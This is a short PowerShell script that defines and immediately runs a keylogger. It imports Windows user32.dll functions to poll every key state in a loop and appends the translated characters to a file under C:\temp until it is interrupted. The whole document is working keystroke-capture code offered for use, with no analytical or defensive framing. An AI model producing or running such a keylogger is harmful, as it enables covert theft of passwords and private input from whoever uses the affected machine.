#requires -Version 2
function Start-KeyLogger($Path="C:\temp\keylogger.txt") 
{
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # Load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  # Create output file
  $null = New-Item -Path $Path -ItemType File -Force

  try
  {
    Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red

    # Create endless loop. When user presses CTRL+C, finally-block
    # executes and shows the collected key presses
    while ($true) {
      Start-Sleep -Milliseconds 40
      
      # Scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # Get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # Is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # Translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # Get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # Prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # Translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success) 
          {
            # Add key to logger file
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
    }
  }
  finally
  {
    Write-Host "Key logger stopped. Results saved to: $Path" -ForegroundColor Green
  }
}

# Records all key presses until script is aborted by pressing CTRL+C
# Will then display the path to the file with collected key codes
Start-KeyLogger
